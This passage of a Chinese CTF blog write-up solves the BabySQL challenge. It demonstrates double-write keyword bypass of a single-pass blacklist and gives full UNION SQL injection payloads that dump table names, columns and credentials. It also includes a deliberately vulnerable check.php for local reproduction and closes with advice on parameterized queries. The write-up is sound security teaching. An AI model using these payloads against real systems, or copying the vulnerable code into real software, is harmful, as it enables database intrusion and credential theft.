+<td>双写有效，过滤只删了一次</td>
+</tr>
+</tbody></table>
+<div class="note success"><p><strong>没有 Burp 也能摸</strong>：用 <code>curl</code> 循环，把每个关键字作为密码发一遍，比较 <code>size_download</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> union <span class="keyword">select</span> and or from <span class="built_in">where</span> information; <span class="keyword">do</span></span><br><span class="line">  <span class="built_in">printf</span> <span class="string">&#x27;%-14s &#x27;</span> <span class="string">&quot;<span class="variable">$w</span>&quot;</span></span><br><span class="line">  curl -s -o /dev/null -w <span class="string">&#x27;%&#123;size_download&#125;\n&#x27;</span> -G <span class="string">&#x27;http://&lt;靶场地址&gt;/check.php&#x27;</span> \</span><br><span class="line">    --data-urlencode <span class="string">&#x27;username=admin&#x27;</span> \</span><br><span class="line">    --data-urlencode <span class="string">&quot;password=1&#x27;<span class="variable">$w</span> 1,2,2#&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><code>--data-urlencode</code> 会自动处理引号、空格和 <code>#</code>，比手拼 URL 省心。</p>
+</div>
+
+<h2 id="第六步：双写绕过的原理"><a href="#第六步：双写绕过的原理" class="headerlink" title="第六步：双写绕过的原理"></a>第六步：双写绕过的原理</h2><p>后端大概率是这样过滤的（只替换一次&#x2F;一轮）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+
+<p><code>str_ireplace</code> 会扫描<strong>原始字符串</strong>，把匹配到的关键字删掉，但不会对“删完之后新拼出来的字符串”再扫一遍。于是：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ununionion</span><br><span class="line">  └─ 中间的 union 被删掉</span><br><span class="line">     ↓</span><br><span class="line">union</span><br></pre></td></tr></table></figure>
+
+<p>把常用关键字都试一遍，整理成表：</p>
+<table>
+<thead>
+<tr>
+<th>想写的关键字</th>
+<th>双写写法</th>
+<th>过滤后剩下</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>union</code></td>
+<td><code>ununionion</code></td>
+<td><code>union</code></td>
+</tr>
+<tr>
+<td><code>select</code></td>
+<td><code>seselectlect</code></td>
+<td><code>select</code></td>
+</tr>
+<tr>
+<td><code>and</code></td>
+<td><code>anandd</code></td>
+<td><code>and</code></td>
+</tr>
+<tr>
+<td><code>or</code></td>
+<td><code>oorr</code></td>
+<td><code>or</code></td>
+</tr>
+<tr>
+<td><code>from</code></td>
+<td><code>frfromom</code></td>
+<td><code>from</code></td>
+</tr>
+<tr>
+<td><code>where</code></td>
+<td><code>whwhereere</code></td>
+<td><code>where</code></td>
+</tr>
+<tr>
+<td><code>information</code></td>
+<td><code>infoorrmation</code></td>
+<td><code>information</code></td>
+</tr>
+<tr>
+<td><code>password</code></td>
+<td><code>passwoorrd</code></td>
+<td><code>password</code></td>
+</tr>
+</tbody></table>
+<div class="note warning"><p>最后两个容易漏：<code>information</code> 和 <code>password</code> 里本身含有 <code>or</code>。只要黑名单里有 <code>or</code>，这两个词也会被削掉，所以要把里面的 <code>or</code> 也双写。</p>
+</div>
+
+<h2 id="第七步：确定列数（这里有个坑）"><a href="#第七步：确定列数（这里有个坑）" class="headerlink" title="第七步：确定列数（这里有个坑）"></a>第七步：确定列数（这里有个坑）</h2><p>先试 3 列：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,2#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/30/web-ctf-sql-babysql/08-column-count-3.png" alt="3 列报错"></p>
+<p><em>图 8：<code>The used SELECT statements have a different number of columns</code></em></p>
+<p>再试 4 列：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,2,3#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/30/web-ctf-sql-babysql/09-column-count-4.png" alt="4 列成功"></p>
+<p><em>图 9：<code>Login Success! Hello 2! Your password is &#39;3&#39;</code></em></p>
+<p>结论：</p>
+<ul>
+<li>原查询是 <strong>4 列</strong>；</li>
+<li>第 2 列回显在 <code>Hello</code> 后面；</li>
+<li>第 4 列回显在 <code>Your password is</code> 后面；</li>
+<li>第 1、3 列不回显。</li>
+</ul>
+<div class="note warning"><p><strong>别被表的列数骗了。</strong> 后面爆列时会看到 <code>b4bsql</code> 表本身只有 <code>id, username, password</code> 三列（图 11），但这里的 <code>UNION</code> 却需要 4 列。这说明后端的 <code>SELECT</code> 不是简单的 <code>SELECT *</code>，而是多查了一个表达式&#x2F;字段，例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, username, <span class="number">1</span>, password <span class="keyword">FROM</span> b4bsql <span class="keyword">WHERE</span> ...</span><br></pre></td></tr></table></figure>
+
+<p>这样一来，表是 3 列，查询结果是 4 列，第 2 列是用户名，第 4 列是密码——和截图里的回显完全对得上。做题时<strong>以 <code>UNION</code> 的列数为准</strong>，不要拿表的列数去硬套。</p>
+</div>
+
+<h2 id="第八步：爆表名"><a href="#第八步：爆表名" class="headerlink" title="第八步：爆表名"></a>第八步：爆表名</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,group_concat(table_name),3</span><br><span class="line">frfromom infoorrmation_schema.tables</span><br><span class="line">whwhereere table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/30/web-ctf-sql-babysql/10-tables.png" alt="爆表"></p>
+<p><em>图 10：当前库里有 <code>b4bsql</code> 和 <code>geekuser</code> 两张表</em></p>
+<p><code>b4bsql</code> 这个名字明显是出题人留的（baby sql），flag 大概率在这张表里。</p>
+<h2 id="第九步：爆列名"><a href="#第九步：爆列名" class="headerlink" title="第九步：爆列名"></a>第九步：爆列名</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,group_concat(column_name),3</span><br><span class="line">frfromom infoorrmation_schema.columns</span><br><span class="line">whwhereere table_schema=database() anandd table_name=&#x27;b4bsql&#x27;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/30/web-ctf-sql-babysql/11-columns.png" alt="爆列"></p>
+<p><em>图 11：<code>id,username,password</code></em></p>
+<h2 id="第十步：把-flag-拖出来"><a href="#第十步：把-flag-拖出来" class="headerlink" title="第十步：把 flag 拖出来"></a>第十步：把 flag 拖出来</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,group_concat(username,0x3a,passwoorrd),3</span><br><span class="line">frfromom b4bsql#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/10/30/web-ctf-sql-babysql/12-flag.png" alt="拖库结果"></p>
+<p><em>图 12：所有用户名和密码被拼成一行，flag 就在里面</em></p>
+<p>注意 payload 里的两个细节：</p>
+<ul>
+<li><code>frfromom</code>：<code>from</code> 被过滤，双写；</li>
+<li><code>passwoorrd</code>：<code>password</code> 里的 <code>or</code> 被过滤，双写。</li>
+</ul>
+<p>页面宽度有限，长字符串可能被 CSS 截断。<strong>按 F12 看 Elements，或者在 Console 里执行 <code>document.body.innerText</code></strong> 复制完整内容。</p>
+<p>完整 flag：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF2&#123;f3074b9f-3480-41cc-a5bc-6fd0a103befa&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="完整-payload-汇总"><a href="#完整-payload-汇总" class="headerlink" title="完整 payload 汇总"></a>完整 payload 汇总</h2><p>万能密码是 <code>1&#39;||1#</code>，填在<strong>用户名框</strong>；下面这些 payload 都是填在<strong>密码框</strong>，用户名保持 <code>admin</code>。</p>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>payload（密码框）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>试 UNION</td>
+<td><code>1&#39;union select 1,2,#</code></td>
+</tr>
+<tr>
+<td>双写探路</td>
+<td><code>1&#39;ununionion seselectlect 1,2,2#</code></td>
+</tr>
+<tr>
+<td>4 列确认</td>
+<td><code>1&#39;ununionion seselectlect 1,2,2,3#</code></td>
+</tr>
+<tr>
+<td>爆表</td>
+<td><code>1&#39;ununionion seselectlect 1,2,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema=database()#</code></td>
+</tr>
+<tr>
+<td>爆列</td>
+<td><code>1&#39;ununionion seselectlect 1,2,group_concat(column_name),3 frfromom infoorrmation_schema.columns whwhereere table_schema=database() anandd table_name=&#39;b4bsql&#39;#</code></td>
+</tr>
+<tr>
+<td>拖数据</td>
+<td><code>1&#39;ununionion seselectlect 1,2,group_concat(username,0x3a,passwoorrd),3 frfromom b4bsql#</code></td>
+</tr>
+</tbody></table>
+<h2 id="本地复现实验（PHP-MySQL）"><a href="#本地复现实验（PHP-MySQL）" class="headerlink" title="本地复现实验（PHP + MySQL）"></a>本地复现实验（PHP + MySQL）</h2><p>在线靶场会失效，但这道题的过滤和双写可以在本地完整复现。需要 PHP + MySQL（XAMPP、phpstudy、Docker 都行）。</p>
+<p><strong>1. 建库建表</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE ctf <span class="keyword">CHARACTER SET</span> utf8mb4;</span><br><span class="line">USE ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE TABLE</span> b4bsql (</span><br><span class="line">  id <span class="type">INT</span> <span class="keyword">PRIMARY KEY</span> AUTO_INCREMENT,</span><br><span class="line">  username <span class="type">VARCHAR</span>(<span class="number">64</span>),</span><br><span class="line">  password <span class="type">VARCHAR</span>(<span class="number">128</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">INSERT INTO</span> b4bsql (username, password) <span class="keyword">VALUES</span></span><br><span class="line">  (<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;57c006f528b390b78398057e3215b924&#x27;</span>),</span><br><span class="line">  (<span class="string">&#x27;flag&#x27;</span>,  <span class="string">&#x27;CTF2&#123;local_test_flag&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 写一个“有漏洞”的 <code>check.php</code></strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;your_password&#x27;</span>, <span class="string">&#x27;ctf&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;connect error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟题目的黑名单：每个关键字只删一次</span></span><br><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;information&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$word</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$word</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$password</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$word</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注意这里查了 4 列：id, username, 常量 1, password</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT id, username, 1, password FROM b4bsql</span></span><br><span class="line"><span class="string">        WHERE username=&#x27;<span class="subst">$username</span>&#x27; AND password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> &amp;&amp; <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_row</span>()) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello <span class="subst">&#123;$row[1]&#125;</span>! Your password is &#x27;<span class="subst">&#123;$row[3]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Login failed: &quot;</span> . <span class="variable">$conn</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>3. 访问并复现</strong></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/check.php?username=1%27%7C%7C1%23&amp;password=1</span><br><span class="line">http://127.0.0.1/check.php?username=admin&amp;password=1%27union%20select%201,2,%23</span><br><span class="line">http://127.0.0.1/check.php?username=admin&amp;password=1%27ununionion%20seselectlect%201,2,2,3%23</span><br></pre></td></tr></table></figure>
+
+<p>观察：</p>
+<ul>
+<li>第一个能登录；</li>
+<li>第二个报错，报错位置里 <code>union select</code> 不见了；</li>
+<li>第三个成功，页面显示 <code>Hello 2! Your password is &#39;3&#39;</code>。</li>
+</ul>
+<p>然后继续用双写 payload 爆库、爆表、爆列、拖数据。你会得到和靶场一样的流程，只是 flag 换成了 <code>local_test_flag</code>。</p>
+<div class="note success"><p>这个实验的关键是 <code>str_ireplace</code> 的“单轮替换”行为。把 <code>str_ireplace</code> 换成 <code>preg_replace</code>（默认也是单轮）效果一样；如果换成 <code>while (strpos(...))</code> 循环删除，双写就会失效，这也是不同题目绕过方式不同的原因。</p>
+</div>
+
+<h2 id="工具速查卡"><a href="#工具速查卡" class="headerlink" title="工具速查卡"></a>工具速查卡</h2><table>
+<thead>
+<tr>
+<th>操作</th>
+<th>Burp 路径</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>抓请求</td>
+<td><code>Proxy → HTTP history</code></td>
+<td>找到登录请求</td>
+</tr>
+<tr>
+<td>送到 Intruder</td>
+<td>右键 → <code>Send to Intruder</code></td>
+<td>快捷键 <code>Ctrl+I</code></td>
+</tr>
+<tr>
+<td>设 payload 位置</td>
+<td><code>Positions → Clear § → Add §</code></td>
+<td>只包住密码值</td>
+</tr>
+<tr>
+<td>载入字典</td>
+<td><code>Payloads → Simple list</code></td>
+<td>一行一个关键字</td>
+</tr>
+<tr>
+<td>比较结果</td>
+<td>结果表按 <code>Length</code> 排序</td>
+<td>和基线长度不同 &#x3D; 有变化</td>
+</tr>
+<tr>
+<td>手动改包</td>
+<td><code>Repeater</code>（<code>Ctrl+R</code>）</td>
+<td>一次改一个关键字，适合验证</td>
+</tr>
+</tbody></table>
+<h2 id="新手常见问题"><a href="#新手常见问题" class="headerlink" title="新手常见问题"></a>新手常见问题</h2><p><details class="note info"><summary><p><strong>Q1：<code>or</code> 被过滤了，为什么 <code>1&#39;||1#</code> 还能用？</strong></p>
+</summary>
+<p><br>黑名单过滤的是字符串 <code>or</code>，<code>||</code> 是逻辑或运算符，不是 <code>or</code> 这三个字符。同理，<code>&amp;&amp;</code>、<code>|</code>、<code>;</code> 这些符号能不能用，要看黑名单有没有单独拦。</p></p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q2：为什么双写能绕过？</strong></p>
+</summary>
+<p>因为过滤只做了一轮替换。<code>ununionion</code> 里只有一个 <code>union</code> 子串，删掉后剩下 <code>union</code>；如果过滤是循环删除直到没有关键字，双写就会失效。看到“双写有效”，基本可以判断后端用的是 <code>str_replace</code> &#x2F; <code>preg_replace</code> 这类单轮替换。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q3：为什么 <code>1,2,2</code> 报列数错误，<code>1,2,2,3</code> 就成功？</strong></p>
+</summary>
+<p><code>UNION</code> 前后列数必须一致。<code>1,2,2</code> 是 3 列，原查询是 4 列；<code>1,2,2,3</code> 是 4 列，正好对上。<strong>以 <code>UNION</code> 的列数为准，不要用表的列数去猜。</strong></p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q4：为什么表只有 3 列，查询却有 4 列？</strong></p>
+</summary>
+<p>后端 <code>SELECT</code> 里多查了一个表达式或字段，比如 <code>SELECT id, username, 1, password FROM ...</code>。表是 3 列，结果集是 4 列。这也是为什么第 2 列回显用户名、第 4 列回显密码。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q5：<code>passwoorrd</code> 为什么多了一个 <code>o</code> 和 <code>r</code>？</strong></p>
+</summary>
+<p><code>password</code> 里含有 <code>or</code>，而 <code>or</code> 在黑名单里。把 <code>or</code> 写成 <code>oorr</code>，过滤删掉一个 <code>or</code>，剩下 <code>or</code>，整个词就恢复成 <code>password</code>。<code>infoorrmation</code> 同理。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q6：为什么 <code>union</code> 大写也被拦？</strong></p>
+</summary>
+<p>过滤用的是 <code>str_ireplace</code> &#x2F; <code>preg_replace</code> 的 <code>i</code> 模式，不区分大小写。大小写绕过只对区分大小写的 <code>str_replace</code> 有效，别默认它一定行。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q7：页面只显示了一部分数据怎么办？</strong></p>
+</summary>
+<p>CSS 可能把长文本截断。按 F12 看 Elements，或者在 Console 执行 <code>document.body.innerText</code>，复制完整内容。也可以直接在 payload 里用 <code>where password like &#39;CTF2%&#39;</code> 过滤，减少输出。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q8：<code>group_concat</code> 结果被截断了？</strong></p>
+</summary>
+<p>MySQL 的 <code>group_concat_max_len</code> 默认 1024 字节。用 <code>substr()</code> 分段读：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,substr(group_concat(username,0x3a,passwoorrd),1,1024),3 frfromom b4bsql#</span><br></pre></td></tr></table></figure>
+
+<p>把 <code>1</code> 改成 <code>1025</code>、<code>2049</code>，继续往后读。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q9：<code>#</code> 为什么要写成 <code>%23</code>？</strong></p>
+</summary>
+<p>浏览器地址栏里 <code>#</code> 表示锚点，后面的内容不会发给服务器。用 Burp 或 <code>curl --data-urlencode</code> 会自动编码；手写 URL 时写成 <code>%23</code>。</p>
+
+</details>
+
+<details class="note info"><summary><p><strong>Q10：怎么知道后端是 MariaDB？</strong></p>
+</summary>
+<p>报错信息里直接写了 <code>MariaDB server version</code>。MariaDB 和 MySQL 语法基本兼容，<code>information_schema</code>、<code>group_concat</code> 都能用。</p>
+
+</details>
+
+<h2 id="顺手聊聊怎么防"><a href="#顺手聊聊怎么防" class="headerlink" title="顺手聊聊怎么防"></a>顺手聊聊怎么防</h2><p>这道题的黑名单已经拦了 <code>union</code>、<code>select</code>、<code>and</code>、<code>or</code>、<code>from</code>、<code>where</code>、<code>information</code>，看起来挺全，但<strong>黑名单永远有遗漏</strong>：双写、大小写、注释、编码、等价函数、堆叠注入……攻击者的想象力比字典大。</p>
+<p>真正靠谱的做法：</p>
+<table>
+<thead>
+<tr>
+<th>优先级</th>
+<th>措施</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>★★★</td>
+<td><strong>预编译语句（参数化查询）</strong></td>
+<td>让输入永远是数据，不进入 SQL 语法</td>
+</tr>
+<tr>
+<td>★★★</td>
+<td><strong>输入白名单校验</strong></td>
+<td>用户名只允许字母数字下划线，长度受限</td>
+</tr>
+<tr>
+<td>★★★</td>
+<td><strong>数据库账号最小权限</strong></td>
+<td>Web 账号不要有 <code>FILE</code>、跨库、<code>information_schema</code> 之外的权限</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>不回显数据库报错</strong></td>
+<td>报错会告诉攻击者过滤规则、列数、数据库类型</td>
+</tr>
+<tr>
+<td>★★☆</td>
+<td><strong>密码加盐哈希</strong></td>
+<td>不要明文&#x2F;MD5 存储</td>
+</tr>
+<tr>
+<td>★☆☆</td>
+<td><strong>WAF &#x2F; 黑名单</strong></td>
+<td>只能提高门槛，不能作为唯一防线</td>
+</tr>
+</tbody></table>
+<p>参数化查询的写法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(</span><br><span class="line">    <span class="string">&#x27;SELECT id, username, password FROM b4bsql WHERE username = ? AND password = ?&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$username</span>, <span class="variable">$password</span>]);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br></pre></td></tr></table></figure>
+
+<div class="note success"><p><strong>一条原则</strong>：不要试图“过滤掉所有坏字符”，而是让用户输入<strong>没有机会变成 SQL 语法</strong>。预编译 + 白名单 + 最小权限，三件事做到，SQL 注入就很难成立。</p>
+</div>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" rel="tag"># 极客大挑战</a>
+              <a href="/tags/SQL-%E6%B3%A8%E5%85%A5/" rel="tag"># SQL 注入</a>
+              <a href="/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/" rel="tag"># 双写绕过</a>
+              <a href="/tags/UNION-%E6%B3%A8%E5%85%A5/" rel="tag"># UNION 注入</a>
+              <a href="/tags/Burp-Suite/" rel="tag"># Burp Suite</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/10/30/web-ctf-file-inclusion-secret-file/" rel="prev" title="[极客大挑战 2019] Secret File：源码注释、302 跳转与 php:&#x2F;&#x2F;filter">
+                  <i class="fa fa-angle-left"></i> [极客大挑战 2019] Secret File：源码注释、302 跳转与 php://filter
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/10/30/misc-lsb-mirror-world/" rel="next" title="[BUUCTF] 镜子里面的世界：用 StegSolve 提取 LSB 隐写">
+                  [BUUCTF] 镜子里面的世界：用 StegSolve 提取 LSB 隐写 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Quellisya</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/Quellisya" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
